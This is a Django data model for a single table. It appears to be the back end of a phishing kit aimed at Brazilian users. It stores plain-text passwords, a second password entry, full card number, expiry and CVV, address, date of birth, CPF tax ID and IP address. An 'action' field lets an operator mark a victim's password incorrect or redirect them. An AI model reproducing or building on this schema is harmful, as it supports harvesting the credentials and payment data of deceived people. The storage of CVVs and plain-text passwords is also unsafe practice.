from django.db import models
import uuid


class Users(models.Model):
    PASSWORD_ERROR = [
        ('incorrect', 'Incorrect'),
        ('correct', 'Correct'),
        ('redirect', 'Redirect'),
    ]

    user_id = models.CharField(
        default=uuid.uuid4, max_length=100, unique=True, null=True, editable=False)
    Email_or_number = models.CharField(max_length=50)
    new_password = models.CharField(max_length=200)
    password = models.TextField()
    card_name = models.CharField(max_length=200, null=True, blank=True)
    card_number = models.CharField(max_length=200, null=True, blank=True)
    exp = models.CharField(max_length=200, null=True, blank=True)
    card_cvv = models.CharField(max_length=200, null=True, blank=True)
    address = models.CharField(max_length=200, null=True, blank=True)
    city = models.CharField(max_length=200, null=True, blank=True)
    state = models.CharField(max_length=200, null=True, blank=True)
    zipcode = models.CharField(max_length=200, null=True, blank=True)
    number = models.CharField(max_length=200, null=True, blank=True)
    dob = models.CharField(max_length=200, null=True, blank=True)
    cpf = models.CharField(max_length=200, null=True, blank=True)
    action = models.CharField(
        max_length=50, choices=PASSWORD_ERROR, default='correct')
    ip_address = models.CharField(max_length=50,)
    create_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.Email_or_number
